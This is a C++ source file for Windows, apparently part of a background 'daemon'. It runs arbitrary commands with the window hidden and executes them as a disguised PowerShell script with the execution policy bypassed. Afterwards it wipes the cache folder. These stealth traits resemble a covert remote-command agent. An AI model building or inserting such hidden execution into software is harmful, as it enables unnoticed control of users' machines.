#include <string>
#include <filesystem>
#include <windows.h>
#include "daemon.h"

Result executeCommand(const char* command) {
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;
    Result res;
    HANDLE hRead, hWrite;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
        res.output = "<INTERNAL_ERROR> Failed to create pipe <INTERNAL_ERROR>";
        res.exitcode = 500;
        return res;
    }

    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;

    PROCESS_INFORMATION pi;
    if (!CreateProcess(NULL, const_cast<char*>(command), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hRead);
        CloseHandle(hWrite);
        res.output = "<INTERNAL_ERROR> Failed to run <INTERNAL_ERROR>";
        res.exitcode = 500;
        return  res;
    }
    CloseHandle(hWrite);

    char buffer[4096];
    DWORD bytesRead;
    std::string output;

    while (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        output += buffer;
    }

    CloseHandle(hRead);

    // Wait for the process to finish and capture the exit code
    WaitForSingleObject(pi.hProcess, INFINITE);

    DWORD exitCode;
    if (!GetExitCodeProcess(pi.hProcess, &exitCode)) {
        exitCode = GetLastError();
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    res.output = output;
    res.exitcode = exitCode;
    return res;
}

Result exec(std::string cmd, std::string BASE_DIR) {
    saveFile(cmd, BASE_DIR+"\\cache\\G5C08C0C.ps1");
    cmd = "powershell -ExecutionPolicy Bypass -Command Set-Location \""+BASE_DIR+"\\cache\"; ./G5C08C0C.ps1";
    //std::cout << cmd << std::endl;
    Result res = executeCommand(cmd.c_str());
    
    //std::cout << "raw output: "+ rawoutput << std::endl;
    res.output = escapeChars(res.output);
    
    //executeCommand(("powershell -ExecutionPolicy Bypass -Command Remove-Item \""+BASE_DIR+"\\cache\\*\" -Recurse -Force").c_str());
    std::string directoryPath = BASE_DIR+"\\cache";
    try {
        if (std::filesystem::exists(directoryPath)) {
            for (const auto& entry : std::filesystem::directory_iterator(directoryPath))
                std::filesystem::remove_all(entry);
        }
    } catch (const std::filesystem::filesystem_error& e) {
        logError("Cache_USER_CRV failure: 9860443E-A51B");
    }
    return res;
}